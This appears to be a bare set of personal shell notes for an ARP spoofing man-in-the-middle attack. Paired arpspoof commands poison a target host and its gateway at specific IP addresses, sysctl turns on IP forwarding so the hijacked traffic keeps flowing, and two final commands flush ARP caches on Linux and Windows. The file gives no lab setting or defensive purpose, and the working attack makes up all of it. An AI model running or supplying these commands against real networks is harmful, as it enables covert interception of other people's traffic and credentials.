arpspoof -i eth0 -t 20.13.57.53 20.0.0.1
arpspoof -i eth0 -t 20.0.0.1 20.13.57.53

sysctl net.ipv4.ip_forward 

sysctl -w net.ipv4.ip_forward=1

sudo ip -s -s neigh flush all

arp -d * # windows
